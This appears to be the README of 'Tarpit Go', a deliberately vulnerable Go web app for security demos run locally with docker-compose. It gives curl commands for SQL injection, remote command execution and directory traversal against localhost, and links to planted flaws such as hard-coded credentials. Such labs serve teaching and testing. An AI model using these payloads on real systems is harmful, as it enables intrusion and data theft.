# Tarpit Go

**Demo steps**
1. Start containers:
```
cd <tarpit_go>
docker-compose up
```
2. Visit http://localhost:3000/login to see the demo; (There are also curl commands version attached)
3. Tear down the environment:
```
control + C
docker-compose down
```

**curl version**
1. Sql injection demo: 
//password='12346" OR ""="'
```
curl -X POST -d "username=admin&password=12346%22+OR+%22%22%3D+%22" http://localhost:3000/login
```
2. Remote code execution:
```
curl -X POST -d "cmd=ls -a" http://localhost:3000/exec
```
3. Directory traversal demo: (login first)
```
curl -X GET http://localhost:3000/image/../demo/demo.go
```
4. Hard Coded credentials:

[https://github.com/AiolosLiu/tarpit_go/blob/master/auth.go#L19](https://github.com/AiolosLiu/tarpit_go/blob/master/auth.go#L19)

5. Sensitive data leak:

[https://github.com/AiolosLiu/tarpit_go/blob/master/auth.go#L26](https://github.com/AiolosLiu/tarpit_go/blob/master/auth.go#L26)

6. Insider attack:

[https://github.com/AiolosLiu/tarpit_go/blob/master/vulns.go#L73](https://github.com/AiolosLiu/tarpit_go/blob/master/vulns.go#L73)

7. Business logic flaw:

[https://github.com/AiolosLiu/tarpit_go/blob/master/workflow.go#L100](https://github.com/AiolosLiu/tarpit_go/blob/master/workflow.go#L100)
